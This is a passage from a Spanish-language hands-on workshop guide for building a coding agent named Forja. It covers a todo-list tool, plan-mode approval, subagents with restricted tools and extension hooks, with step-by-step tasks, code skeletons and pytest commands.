- Cómo se conecta: `Forja._build_registry` registra `make_todo_tool(self.todos)` y `make_exit_plan_tool(self._approve_plan, lambda: self.set_mode("default"))`. La lista de tareas vuelve al system prompt en cada paso mediante `extra` en `build_system_prompt` (lab 06). El modo plan es de solo lectura porque `permissions.decide` (lab 04) deniega las herramientas que no son de lectura en `plan`, no porque el modelo se porte bien.

### Paso a paso
Primero el 08.1 (lógica de validación, totalmente cubierta por `test_todo_write_validation`), luego el 08.2 (corto). `test_plan_mode_flow`, seleccionado con el 08.2, conduce un turno completo en modo plan a través del harness y necesita que el 08.1, el 08.2, el lab 04 (deny en modo plan) y el lab 06 (las capas del prompt) funcionen.

#### TODO 08.1 · `forja/planning.py` · `make_todo_tool(store)` → interna `todo_write(todos: list[TodoItem]) -> str`

**Qué debe hacer:** Sustituye la lista ENTERA de `store.items` por los elementos recibidos, tras validar: cada elemento se convierte a `TodoItem`; más de un `in_progress` → `ValueError` (su mensaje debe contener `one task`, p. ej. `only one task can be in_progress at a time`); un elemento con `content` vacío/en blanco → `ValueError`. La validación ocurre ANTES de tocar el store: si hay error, la lista anterior se mantiene. Devuelve `"List updated (X/N completed):\n" + store.render()` (X = completados, N = total). `test_todo_write_validation` espera `1/3` en la salida, las líneas renderizadas `["☑ read", "▶ edit", "☐ tests"]`, y tras la llamada con doble `in_progress`: `ok` falso, `one task` en la salida y todavía 3 elementos en el store.

**Pasos:**
1. Convierte: `items = [t if isinstance(t, TodoItem) else TodoItem.model_validate(t) for t in todos]`.
2. Cuenta los elementos con `status == "in_progress"`; si hay más de 1, lanza `ValueError` con un mensaje sobre el que el modelo pueda actuar.
3. Si algún elemento cumple `not t.content.strip()`, lanza `ValueError`.
4. Solo ahora asigna `store.items = items`.
5. Cuenta los elementos completados y devuelve la línea de cabecera más `store.render()`.

**Cuidado con:**
- Asigna `store.items` solo cuando pasen todas las comprobaciones: el test comprueba que una llamada rechazada deja los 3 elementos antiguos.
- El texto del error debe contener `one task` (el test hace `"one task" in two.output`).
- Un `content` con solo espacios también está vacío: usa `.strip()`.
- Lanza la excepción, no devuelvas una cadena de error: una cadena devuelta cuenta como éxito (`ok=True`) y el test espera `not two.ok`.
- Mantén la forma de factoría: `todo_write` debe seguir siendo una función interna que captura `store` en su closure y se devuelve al final.

<details><summary>💡 Pista 1</summary>

Tres fases: normalizar, validar, confirmar. Confirmar al final.

</details>

<details><summary>💡 Pista 2</summary>

`sum(t.status == "in_progress" for t in items)` cuenta booleanos.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
items = [...]               # dict or TodoItem -> TodoItem
if sum(...) > 1:
    raise ValueError("only one task can be in_progress at a time")
if any(...):                # blank content
    raise ValueError(...)
store.items = items
done = ...
return f"List updated ({done}/{len(items)} completed):\n{store.render()}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l08_planning.py -k todo_write -v
```

#### TODO 08.2 · `forja/planning.py` · `make_exit_plan_tool(approve, on_approved)` → interna `exit_plan_mode(plan: str) -> str`

**Qué debe hacer:** `plan` vacío/en blanco → `ValueError`. Si no, llama a `approve(plan)` exactamente una vez (en el CLI muestra el plan como Markdown y pregunta `Approve the plan and start? [y/N]`; en headless o en los tests es una función que devuelve `bool`). Si se aprueba: llama a `on_approved()` (el harness cambia al modo `default`) y devuelve un texto que contenga `APPROVED` y que diga al modelo que ya no está en modo plan y que debe implementar el plan paso a paso y verificarlo. Si se rechaza: NO llames a `on_approved` y devuelve un texto que contenga `REJECTED` indicando que sigue en modo plan y que debe preguntar qué cambiar o proponer una alternativa. `test_exit_plan_tool` comprueba ambas ramas y que el callback solo se ejecutó al aprobar; `test_plan_mode_flow` comprueba que tras la aprobación `app.mode == "default"`.

**Pasos:**
1. Valida `plan.strip()`; lanza `ValueError` si está vacío.
2. Llama a `approve(plan)` una vez y guarda el booleano.
3. Si es verdadero: llama a `on_approved()` y luego devuelve la instrucción APPROVED.
4. Si es falso: devuelve la instrucción REJECTED.

**Cuidado con:**
- Las palabras `APPROVED` y `REJECTED` deben ir en mayúsculas en el texto: los tests las buscan, y las mayúsculas también ayudan a los modelos pequeños a notar el cambio de estado.
- Llama a `on_approved()` solo en la rama aprobada, y solo una vez.
- El texto devuelto es una instrucción para el MODELO, no para el usuario: di claramente qué hacer a continuación (implementar + verificar, o preguntar/proponer). Un `ok` vago hace que los modelos pequeños replanifiquen eternamente.
- No cambies el modo tú aquí: la herramienta no conoce el harness; lo hace el callback `on_approved`.

<details><summary>💡 Pista 1</summary>

Es una cláusula de guarda más un if/else alrededor de un callback.

</details>

<details><summary>💡 Pista 2</summary>

Los dos callbacks se inyectan para que la herramienta se pueda probar sin UI ni harness.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

Esqueleto:
```python
if not plan.strip():
    raise ValueError(...)
if approve(plan):
    ...                     # callback
    return "The user APPROVED the plan. ..."
return "The user REJECTED the plan. ..."
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l08_planning.py -k "exit_plan or plan_mode_flow" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 08
forja --cwd playground --mode plan
> añade descuentos porcentuales a las facturas (antes del IVA) con tests
/todos
```

### Pruébalo en tu agente
1. `python scripts/tasks.py reset` y luego `forja --cwd playground --mode plan`. El prompt muestra `plan ›`.
2. Pide: `add percentage discounts to invoices (before VAT) with tests`. Esperado: solo acciones de lectura (`⏺ Read ...`, `⏺ Grep ...`, `⏺ Glob ...`). Si el modelo intenta una edición verás un `⎿ DENIED (plan mode: read-only) ...` en rojo y volverá a investigar.
3. Aparece un panel magenta `Proposed plan` con los ficheros a tocar, los cambios y cómo verificarlo, seguido de `Approve the plan and start? [y/N] >`. Responde `n` una vez: el modelo recibe `REJECTED` y pregunta qué cambiar. Dile qué ajustar y aprueba con `y` la siguiente vez.
4. Tras `y`: el modo del REPL pasa a `default` (el siguiente prompt muestra `default ›`), las ediciones ahora piden aprobación y ves líneas `⏺ Todos (N)` a medida que el agente marca tareas. Escribe `/todos` cuando quieras: `☑ ...`, `▶ ...`, `☐ ...`.
5. Al final el agente ejecuta los tests; compruébalo tú con `cd playground` y `python -m pytest -q`. Luego `python scripts/tasks.py reset` para limpiar.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_todo_write_validation`: falla `assert len(store.items) == 3` (es 2) | Asignaste `store.items` antes de validar → valida primero, confirma al final. |
| `test_todo_write_validation`: falla `not two.ok` | Devolviste una cadena de error en lugar de lanzar una excepción → `raise ValueError(...)`. |
| `AttributeError: 'dict' object has no attribute 'status'` | El registry pasa dicts → convierte con `TodoItem.model_validate(d)` (deja las instancias de `TodoItem` como están). |
| `test_plan_mode_flow`: falla `assert "PLAN mode" in llm.calls[0]["messages"][0]["content"]` | El lab 06 no está hecho, así que el harness usa `FALLBACK_PROMPT` → termina el 06.2 (o ejecuta `python scripts/tasks.py catchup 07`). |
| `test_plan_mode_flow`: el primer resultado de herramienta no es `DENIED` | El `decide` del lab 04 no deniega las herramientas que no son de lectura en modo plan → revisa el TODO 04.x; el mensaje debe contener `plan mode`. |
| El modelo real nunca llama a `exit_plan_mode` y se limita a escribir el plan como texto | Los modelos pequeños hacen eso → díselo explícitamente: `when you have the plan, present it with exit_plan_mode`; o prueba un modelo más potente. |
| El modelo real pone varias tareas `in_progress` y entra en bucle con el error | Haz que el mensaje del `ValueError` sea accionable (`only one task can be in_progress at a time`); el modelo lo lee y reintenta con una sola. |
| En headless (`forja -p ... --mode plan`) siempre se rechaza el plan | Sin usuario, `plan_approver` es `None` → es lo esperado; el modo plan está pensado para uso interactivo. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 08` → 3 passed.
- [ ] [ ] En modo plan el agente investiga, presenta un plan con `exit_plan_mode` y, tras `y`, lo ejecuta marcando tareas (`/todos` muestra el progreso).
- [ ] [ ] Viste al menos un `DENIED (plan mode: read-only)` o un `REJECTED` y el agente se recuperó.

### Checkpoint
En modo plan el agente investiga, presenta un plan y, al aprobarlo, lo ejecuta marcando tareas.

### Retos
1. Al aprobar, pasa a `accept_edits` en vez de `default`. ¿Cuándo es buena idea?
2. Muestra la lista de tareas en vivo bajo cada respuesta.

**Tests:** `tests/test_l08_planning.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 09`


---

## Lab 09 · Subagentes

*Día 2 · 11:25–12:10*

**Objetivo:** Delegar exploraciones y revisiones en agentes con contexto propio y tools restringidas.

### Conceptos
- **El problema:** explorar un repo cuesta 20 lecturas y 30k tokens que se quedan en el contexto del agente principal para siempre.
- **La solución:** la tool `task` lanza un subagente con contexto LIMPIO (system + prompt) que devuelve solo la conclusión. El principal paga ~300 tokens.
- **Mismo bucle, otras tools:** reutilizamos `Agent` del lab 03 con un subconjunto de tools y la MISMA puerta de permisos. Un subagente no lanza subagentes.
- **Perfiles en Markdown:** `.forja/agents/reviewer.md` con frontmatter (name, description, tools). La descripción es lo que lee el modelo para decidir cuándo delegar.
- **El prompt del subagente debe ser autocontenido:** no ve la conversación.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 09.1 | `forja/subagents.py` | load_profiles: perfiles desde Markdown |
| 09.2 | `forja/subagents.py` | task: lanzar un subagente con contexto limpio |

### Antes de empezar
- Abre `forja/subagents.py` (tus TODOs) y ten abiertos al lado `forja/agent.py` (lab 03) y `forja/harness.py` (`_build_registry`). El harness ya llama a `subagents.load_profiles(root / ".forja" / "agents")` y registra `subagents.make_task_tool(self.llm, reg, profiles, execute=self.gate, events_factory=self.sub_events)`: tú solo rellenas las dos funciones.
- Lo que reutilizas: `Agent(llm, tools, execute=..., events=..., max_steps=...)` y su `run(messages) -> AgentResult` (campos `answer`, `stop_reason`, `steps`, `tool_calls`, `usage`). `ToolRegistry.subset(names)` construye un registro solo con los nombres que existen (los nombres desconocidos se omiten en silencio).
- Stdlib / librerías usadas: `Path.glob("*.md")`, `Path.read_text(encoding="utf-8")`, la regex precompilada `FRONTMATTER` (grupo 1 = YAML entre las líneas `---`, grupo 2 = cuerpo) y `yaml.safe_load` (devuelve un dict, o `None` para un YAML vacío). `tools: read_file, grep` en YAML es un *string*; `tools: [read_file, grep]` es una *lista*.
- Idea clave: el subagente parte de una lista `messages` NUEVA (system + prompt del usuario). Nunca ve el historial principal; el agente principal solo recibe el string que devuelve tu herramienta `task`. Aun así, cada llamada a herramienta del subagente pasa por `execute` = la puerta del harness (hooks, permisos, aprobaciones, checkpoints).
- Mira `examples/project/.forja/agents/reviewer.md` para ver un perfil real (tiene `tools` y `max_steps`).

### Paso a paso
Haz primero 09.1: es puro parseo, tiene su propio test aislado (`test_load_profiles`) y el harness lo necesita para construir la lista de subagentes que aparece en la descripción de la herramienta `task`. Después 09.2, cuyos tests (`test_task_isolated_context`, `test_unknown_subagent`) pasan por el harness completo, así que los labs 02-04 ya deben pasar.

#### TODO 09.1 · `forja/subagents.py` · `load_profiles(folder: Path) -> dict[str, AgentProfile]`

**Qué debe hacer:** Recibe la carpeta de agentes (puede no existir). Devuelve un dict `name -> AgentProfile` que SIEMPRE contiene el perfil integrado `explore` (parte de una copia de `BUILTIN`, nunca mutes el propio `BUILTIN`). Por cada fichero `*.md` con frontmatter válido que tenga `name` y `description`, añade `AgentProfile(name, description, system=<body stripped>, tools=<list[str]>, max_steps=<int, default 25>)`. Los ficheros sin frontmatter o sin `name`/`description` se omiten en silencio. El test comprueba: `set(p) == {"explore", "reviewer"}`, `tools == ["read_file", "grep"]` (a partir del string `read_file, grep`), `max_steps == 5`, `system == "You are a reviewer."`, y que una carpeta inexistente devuelve exactamente `BUILTIN`.

**Pasos:**
1. Crea `profiles = dict(BUILTIN)`; si la carpeta no es un directorio, devuélvelo directamente.
2. Recorre los ficheros `*.md` en un orden estable (`sorted`). Lee cada uno como UTF-8 y aplica `FRONTMATTER.match`.
3. Sin coincidencia → omítelo. Con coincidencia → `yaml.safe_load(group 1)`, y trata `None` como `{}`.
4. Omítelo si falta `name` o `description` o están vacíos.
5. Normaliza `tools`: por defecto `["read_file", "grep", "glob"]`; si es un string, divídelo por comas y haz strip de cada elemento, descartando los vacíos; si ya es una lista, mantenla.
6. Construye el perfil: el cuerpo (grupo 2) con `.strip()` es el system prompt; `max_steps` con `int(...)` y valor por defecto 25. Guárdalo bajo su `name` (un fichero puede sobrescribir `explore` si usa ese nombre).

**Cuidado con:**
- Devolver el propio `BUILTIN` y luego añadirle cosas muta la constante del módulo: el siguiente test (`load_profiles(missing) == BUILTIN`) o la siguiente instancia del harness verán perfiles obsoletos. Cópialo.
- `tools: read_file, grep` es el string `'read_file, grep'`. Si olvidas dividirlo obtienes `['r','e','a',...]` al iterarlo, o un único nombre de herramienta desconocido — y `subset()` descarta en silencio los nombres desconocidos, así que el subagente acaba SIN herramientas.
- `system` debe ser el cuerpo *sin* el frontmatter y con strip: el test lo compara exactamente.
- `yaml.safe_load` sobre un frontmatter que solo contiene comentarios devuelve `None`: hacer `.get` sobre él lanza `AttributeError`.

<details><summary>💡 Pista 1</summary>

Es el mismo parseo "frontmatter + cuerpo" que volverás a hacer para las skills en el lab 10. La regex ya está compilada para ti.

</details>

<details><summary>💡 Pista 2</summary>

`m = FRONTMATTER.match(text)`; `meta = yaml.safe_load(m.group(1)) or {}`; `m.group(2).strip()` es el system prompt. `isinstance(tools, str)` te dice cuándo dividir.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
profiles = dict(BUILTIN)
if not folder.is_dir(): return profiles
for f in sorted(folder.glob("*.md")):
    m = ...            # FRONTMATTER.match on the file text
    if not m: continue
    meta = ...         # yaml, never None
    if <missing name or description>: continue
    tools = ...        # default list; split 'a, b' strings
    profiles[meta["name"]] = AgentProfile(...)
return profiles
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l09_subagents.py -k load_profiles -v
```

#### TODO 09.2 · `forja/subagents.py` · `make_task_tool(...)` → herramienta interna `task(description, prompt, subagent_type="explore") -> str`

**Qué debe hacer:** `make_task_tool` ya está escrita salvo el cuerpo de `task`. Dentro de `task`: busca `profiles[subagent_type]`; si no existe lanza `ValueError` cuyo mensaje contenga `unknown` y liste los nombres disponibles (el registro lo convierte en un resultado de herramienta fallido; `test_unknown_subagent` comprueba que contiene `"unknown"`). Construye el registro del subagente con `parent_tools.subset(...)` usando las herramientas del perfil MENOS `"task"`. Crea un `Agent` con el mismo `llm`, ese subregistro, `execute=execute`, `max_steps=prof.max_steps` y `events=events_factory(prof.name)` si se pasó una factoría, si no `Events()`. Ejecútalo sobre una lista NUEVA `[{"role": "system", "content": prof.system}, {"role": "user", "content": prompt}]`. Devuelve una cabecera que contenga `subagent <name>` (el test busca `"subagent explore"`), p. ej. `[subagent explore · <description> · N steps · M tools · <stop_reason>]`, luego un salto de línea y `res.answer`. El test también comprueba que la primera llamada al LLM del subagente tuvo exactamente 2 mensajes empezando por el system prompt de explore, que se le ofrecieron exactamente `{read_file, grep, glob}`, y que el historial principal solo contiene UN mensaje de herramienta (`task`).

**Pasos:**
1. Busca el perfil; si no está, `raise ValueError(f"unknown subagent: ... Available: ...")`.
2. Calcula los nombres de herramientas permitidos: las `tools` del perfil sin `"task"` (sin recursión).
3. `sub_tools = parent_tools.subset(those names)`.
4. Elige el objeto de eventos: `events_factory(prof.name)` cuando la factoría no es `None`, si no `Events()`. En el CLI esta factoría imprime las llamadas a herramientas del subagente con el prefijo `[explore]`.
5. Envuelve `execute` en un pequeño `sub_execute(call)`: si `call.name` no está en `sub_tools.tools`, devuelve `ToolResult(call.id, call.name, False, "ERROR: tool '...' is not available to subagent '...'")`; si no, delega en `execute` (o en `sub_tools.execute` cuando `execute` es `None`). La lista de esquemas solo *ofrece* herramientas; el modelo puede llamar a otras igualmente.
6. Crea el `Agent` (mismo `llm`, `execute=sub_execute`, `max_steps=prof.max_steps`) y llama a `run` con una lista NUEVA de dos mensajes.
7. Formatea y devuelve la línea de cabecera + el `answer` del subagente (usa `res.steps`, `res.tool_calls`, `res.stop_reason`).

**Cuidado con:**
- Reutilizar o copiar el historial del padre: el subagente debe empezar limpio (`len(messages) == 2` en su primera llamada).
- Pasar `parent_tools` en vez del subconjunto: el subagente tendría `write_file`, `bash`, `task`… y `test_task_isolated_context` falla en el conjunto de herramientas.
- Olvidar pasar por `execute`: el subagente se saltaría la puerta (sin permisos, sin hooks, sin checkpoints).
- Fiarse de la lista de herramientas ofrecida: `test_subagent_cannot_use_tools_outside_its_profile` hace que el modelo llame a `write_file` desde `explore`; tu wrapper debe rechazarlo y el fichero no debe existir.
- El mismo `FakeLLM` sirve al agente principal y al subagente en orden de llamada: si tu `task` hace una llamada extra al LLM (o ninguna), todas las respuestas guionizadas se desplazan y las aserciones fallan de formas confusas.
- No toques `task.description`: se asigna después de la función e incluye el catálogo que lee el modelo para elegir subagente.

<details><summary>💡 Pista 1</summary>

Todo el subagente es simplemente el `Agent` del lab 03 con un registro más pequeño y una lista de mensajes nueva.

</details>

<details><summary>💡 Pista 2</summary>

`parent_tools.subset([t for t in prof.tools if t != "task"])`; `Agent(llm, sub_tools, execute=sub_execute, max_steps=..., events=...)`; `res = agent.run(messages)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
prof = profiles.get(subagent_type)
if prof is None: raise ValueError(...)  # 'unknown', list names
sub_tools = ...                 # subset, never 'task'
def sub_execute(call): ...     # refuse names not in sub_tools.tools
events = ...                    # factory(name) or Events()
agent = Agent(...)
res = agent.run([...])         # system + user ONLY
return f"[subagent {prof.name} · ...]\n{res.answer}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l09_subagents.py -k "task_isolated or unknown_subagent or outside_its_profile" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\project\.forja playground\.forja
forja --cwd playground
> usa un subagente para averiguar todos los sitios donde se redondea
> pide al subagente reviewer que revise mis cambios sin commitear
```

### Pruébalo en tu agente
1. Copia la configuración del proyecto de ejemplo al playground. macOS/Linux: `cp -r examples/project/.forja playground/` · PowerShell: `Copy-Item -Recurse examples\project\.forja playground\.forja` · cmd: `xcopy /E /I examples\project\.forja playground\.forja`.
2. `forja --cwd playground`, y luego `/tools`: deberías ver `task [read]` al final de la lista, y ninguna nota `subagents: lab 09 pending` al arrancar.
3. Escribe `use a subagent to find every place where amounts are rounded`. Esperado: `⏺ task …`, luego líneas sangradas `  [explore] ⏺ grep …` / `  [explore] ⏺ read_file …` (las llamadas del subagente; su texto no se muestra en streaming), y finalmente la respuesta del agente principal listando ubicaciones `path:line`.
4. Ejecuta `/context` antes y después: el contexto principal crece unos cientos de tokens, no el tamaño de cada fichero que leyó el subagente.
5. Edita algo a mano en `playground/invoices/` y luego: `ask the reviewer subagent to review my uncommitted changes`. Deberías ver `  [reviewer] ⏺ bash git diff …` (permitido por `bash(git diff*)` en settings) y una revisión con secciones numeradas.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_task_isolated_context` falla con `StopIteration` / FakeLLM 'no more responses' | Tu `task` llama al LLM un número distinto de veces (p. ej. ejecutaste `agent.run` dos veces, o el bucle principal del lab 03 está roto) → un `Agent.run` por llamada a task; ejecuta antes `tests/test_l03_agent.py`. |
| Aserción sobre `{t['function']['name'] ...} == {'read_file','grep','glob'}` | Pasaste el registro completo del padre, o incluiste `task` → usa `parent_tools.subset(...)` filtrando `task`. |
| El subagente no tiene herramientas / responde sin leer nada | En 09.1 no se dividió `tools` (string `'read_file, grep'`), así que `subset()` descartó todos los nombres → divide por comas y haz strip. |
| `reviewer` no aparece en la descripción de `task` / 'unknown subagent: reviewer' | El fichero del perfil no tiene frontmatter `---` en la primerísima línea, o le falta `description` → arregla el fichero; los perfiles se leen de `<project>/.forja/agents/`, así que comprueba que copiaste `.forja` en `playground/`. |
| Sin prefijo `[explore]` en el CLI, las llamadas del subagente parecen del principal | Ignoraste `events_factory` y usaste siempre `Events()` (entonces no ves nada) o pasaste los eventos principales → usa `events_factory(prof.name)` cuando no sea `None`. |
| El modelo pequeño nunca delega | Los modelos de 8B suelen preferir hacerlo ellos mismos → pídelo explícitamente ('use a subagent…'); la descripción de `task` es lo único que lee para decidir. |
| Windows: `cp -r` falla en cmd.exe | `cp` solo existe en PowerShell (como alias) → usa `xcopy /E /I examples\project\.forja playground\.forja` en cmd. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 09` → 3 passed.
- [ ] [ ] En el CLI ves llamadas a herramientas con prefijo `[explore]` y `/context` apenas crece tras una búsqueda delegada.
- [ ] [ ] El perfil `reviewer` de `.forja/agents/` aparece en la descripción de la herramienta `task` y se puede invocar por nombre.

### Checkpoint
Ves las tool calls del subagente con prefijo `[explore]` y el contexto del principal apenas crece (`/context`).

### Retos
1. Crea un subagente `tester` que solo pueda ejecutar `python -m pytest*`.
2. Ejecuta el subagente con un modelo más pequeño y rápido.

**Tests:** `tests/test_l09_subagents.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 10`


---

## Lab 10 · Extensibilidad: hooks, skills y MCP

*Día 2 · 12:10–13:20*

**Objetivo:** Que el equipo extienda el agente sin tocar su código: política determinista, conocimiento bajo demanda y herramientas externas.

### Conceptos
- **Hooks = garantías:** AGENTS.md *pide*, un hook *impide*. Comandos de shell en `settings.json` que reciben el evento como JSON por stdin. Exit 2 bloquea; exit 0 sigue. Es la convención que usan los agentes comerciales: lo que aprendáis aquí os sirve allí.
- **Eventos:** `PreToolUse` (bloquear), `PostToolUse` (feedback, p. ej. linter), `UserPromptSubmit` (filtrar o añadir contexto), `Stop` (no terminar hasta que pasen los tests).
- **Skills = divulgación progresiva:** en el prompt solo va el catálogo (nombre + descripción); el cuerpo se carga con la tool `skill` cuando hace falta. Formato portable `SKILL.md`.
- **MCP:** servidores que exponen tools (issues, BD, wiki, CI). Forja los arranca desde `settings.json` y los registra como `mcp__servidor__tool`, con riesgo `exec`: pasan por permisos.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 10.1 | `forja/hooks.py` | matching: hooks por evento y matcher |
| 10.2 | `forja/hooks.py` | run: ejecutar y traducir códigos de salida |
| 10.3 | `forja/skills.py` | discover_skills: catálogo de SKILL.md |
| 10.4 | `forja/skills.py` | skill: cargar el cuerpo bajo demanda |
| 10.5 | `forja/mcp_tools.py` | mcp_tool_name: espacio de nombres mcp__server__tool |

### Antes de empezar
- Tres ficheros pequeños, tres ideas: `forja/hooks.py` (10.1, 10.2), `forja/skills.py` (10.3, 10.4) y `forja/mcp_tools.py` (10.5). El harness (`forja/harness.py`) ya los llama: `self.hooks.run("PreToolUse", {...}, tool.name)` en `gate`, `"PostToolUse"` tras ejecutar, `"UserPromptSubmit"` y `"Stop"` en `turn`; `skills.discover_skills(home/.forja/skills, root/.forja/skills)` al arrancar; `mcp_tool_name` dentro de `connect_servers`.
- API de hooks: `subprocess.run(cmd, shell=True, cwd=..., input=<json str>, capture_output=True, text=True, timeout=...)` devuelve un `CompletedProcess` con `returncode`, `stdout`, `stderr`; lanza `subprocess.TimeoutExpired` si se agota el tiempo. `re.fullmatch(pattern, s)` casa con el string ENTERO (así `edit_file|write_file` funciona como alternativa). Con `shell=True` el shell es cmd.exe en Windows y `/bin/sh` en macOS/Linux.
- Convención de códigos de salida (la misma que los agentes comerciales): `0` = OK (stdout puede ser contexto útil), `2` = BLOQUEO (stderr, o stdout si está vacío, es el mensaje para el modelo), cualquier otro = error del hook (se registra, nunca bloquea). `HookOutcome` tiene `block`, `message`, `context`, `errors`.
- Las skills reutilizan el parseo de frontmatter que escribiste en 09.1 (`FRONTMATTER` + `yaml.safe_load`). `catalog()` ya está escrita: solo necesita `Skill.name` y `Skill.description`.
- Mira `examples/project/.forja/settings.json` y `examples/project/.forja/hooks/*.py`: un hook PreToolUse real lee el evento con `json.load(sys.stdin)` y sale con 2 y un mensaje en stderr.

### Paso a paso
10.1 → 10.2 (un test cubre ambos: `test_hook_matching_and_exit_codes`; luego `test_hooks_in_harness` comprueba la integración), después 10.5 (una línea, victoria rápida), y luego 10.3 → 10.4 (ambos comprobados por `test_skills`). Deja `test_mcp_end_to_end` para el final: arranca un subproceso de servidor MCP real y necesita que los labs 02-04 funcionen.

#### TODO 10.1 · `forja/hooks.py` · `HookRunner.matching(event: str, tool_name: str | None = None) -> list[dict]`

**Qué debe hacer:** Devuelve, en el orden de la configuración, los dicts de hook de `self.config.get(event, [])` que aplican. Un hook SIN `matcher` aplica siempre. Un hook CON `matcher` aplica solo si `tool_name` no es `None` y `re.fullmatch(matcher, tool_name)` casa. Evento desconocido → `[]`. Test: `[h.get("matcher") for h in runner.matching("PreToolUse", "bash")] == ["bash", None]`, `len(matching("PreToolUse", "write_file")) == 2`, `matching("Stop") == []`.

**Pasos:**
1. Obtén la lista del evento con `.get(event, [])` (que falten eventos es normal).
2. Para cada hook lee `h.get("matcher")`.
3. Sin matcher → consérvalo.
4. Matcher pero sin `tool_name` (eventos como `Stop`/`UserPromptSubmit`) → omítelo.
5. Matcher y `tool_name` → consérvalo solo si `re.fullmatch` tiene éxito. Mantén el orden original.

**Cuidado con:**
- `re.match`/`re.search` en lugar de `fullmatch`: `bash` casaría también con `bash_tool`, y `edit_file|write_file` con `re.match` acepta prefijos. El test espera exactamente 2 hooks para `write_file`.
- `self.config[event]` lanza `KeyError` para eventos que nadie configuró — `matching("Stop")` debe devolver `[]`.
- Los matchers son REGEX, no globs: en settings escribe `mcp__issues__.*`, no `mcp__issues__*` (esa es la sintaxis de las reglas de permisos).

<details><summary>💡 Pista 1</summary>

Tres casos por hook: sin matcher, matcher sin nombre de herramienta, matcher con nombre de herramienta.

</details>

<details><summary>💡 Pista 2</summary>

`re.fullmatch(matcher, tool_name)` devuelve un objeto match o `None`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
out = []
for h in self.config.get(event, []):
    matcher = h.get("matcher")
    if matcher and <no tool_name or no fullmatch>:
        continue
    out.append(h)
return out
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k hook_matching -v
```

#### TODO 10.2 · `forja/hooks.py` · `HookRunner.run(event: str, payload: dict, tool_name: str | None = None) -> HookOutcome`

**Qué debe hacer:** Serializa `{"hook_event_name": event, "cwd": str(self.cwd), **payload}` a JSON (`ensure_ascii=False, default=str`) y lo envía por stdin a CADA hook que case (se ejecutan todos, incluso después de un bloqueo). Por hook: salida 2 → `block=True` y añade `stderr` (o `stdout`, o un texto por defecto) con strip + salto de línea a `message`; salida 0 → añade el `stdout` no vacío con strip a `context`; otros códigos → añade una descripción a `errors`; `TimeoutExpired` → añade a `errors` y continúa. Usa `h.get("timeout", self.timeout)`. Al final haz strip de `message` y `context`. Tests: PreToolUse con hooks que salen con 2 / 0 / 1 → `block` y `message == "no"` y `len(errors) == 1`; UserPromptSubmit que imprime `ctx:` + prompt → `context == "ctx:hello"`, sin bloquear, 1 error. En el harness (`test_hooks_in_harness`): `BLOCKED by hook` en el resultado de la herramienta y el hook Stop fuerza una ronda más.

**Pasos:**
1. Crea un `HookOutcome()` vacío y construye el string JSON una sola vez.
2. Para cada hook de `self.matching(event, tool_name)` llama a `subprocess.run` con `h["command"]`, `shell=True`, `cwd=self.cwd`, el JSON como `input`, `capture_output=True`, `text=True` y el timeout.
3. Envuelve la llamada en `try/except subprocess.TimeoutExpired` → registra un error, `continue`.
4. Ramifica según `returncode`: 2 → bloqueo + mensaje; 0 → contexto si stdout tiene texto; resto → errors (incluye el código y un trozo de stderr).
5. Tras el bucle, haz `.strip()` de `message` y `context` para que los saltos de línea finales no rompan las comparaciones exactas.

**Cuidado con:**
- Parar en el primer hook que bloquea: la configuración del test tiene un tercer hook (salida 1) que debe ejecutarse igualmente, dando `len(errors) == 1`.
- Olvidar `text=True`: entonces `input` debe ser bytes y `stdout` vuelve como bytes → `TypeError` o `b'no'` != `'no'`.
- No hacer strip: `message` sería `'no\n'`; el test compara con `== "no"`.
- Sin `cwd=self.cwd` los comandos de hook relativos (`python .forja/hooks/x.py`) y el hook Stop del test (`pathlib.Path('DONE')`) buscan en la carpeta equivocada.
- Windows: el test construye comandos como `"C:/path/python.exe" -c "..."`; eso solo funciona con `shell=True` (cmd.exe interpreta las comillas).

<details><summary>💡 Pista 1</summary>

Ejecuta cada comando una vez con el evento en stdin y fíjate solo en `returncode`, `stdout`, `stderr`.

</details>

<details><summary>💡 Pista 2</summary>

`p = subprocess.run(h["command"], shell=True, cwd=self.cwd, input=data, capture_output=True, text=True, timeout=h.get("timeout", self.timeout))`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
outcome = HookOutcome()
data = json.dumps({...}, ensure_ascii=False, default=str)
for h in self.matching(event, tool_name):
    try: p = subprocess.run(...)
    except subprocess.TimeoutExpired: outcome.errors.append(...); continue
    if p.returncode == 2: ...          # block, message += stderr or stdout
    elif p.returncode == 0: ...        # context += stdout
    else: ...                          # errors
# strip message and context
return outcome
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k hook -v
```

#### TODO 10.3 · `forja/skills.py` · `discover_skills(*folders: Path) -> dict[str, Skill]`

**Qué debe hacer:** Para cada carpeta que exista, mira `<folder>/*/SKILL.md` (ordenados). Parsea el frontmatter; conserva solo los ficheros con `name` y `description`. Guarda `Skill(name, description_normalised, path_to_SKILL.md)` bajo `name`; las carpetas posteriores sobrescriben a las anteriores (el harness pasa primero la carpeta del usuario y después la del proyecto, así que gana el proyecto). Normaliza los espacios de la descripción: la descripción YAML del test ocupa dos líneas y debe quedar exactamente `"How to make commits here."`. Un `SKILL.md` sin frontmatter se omite (`list(sk) == ["commits"]`).

**Pasos:**
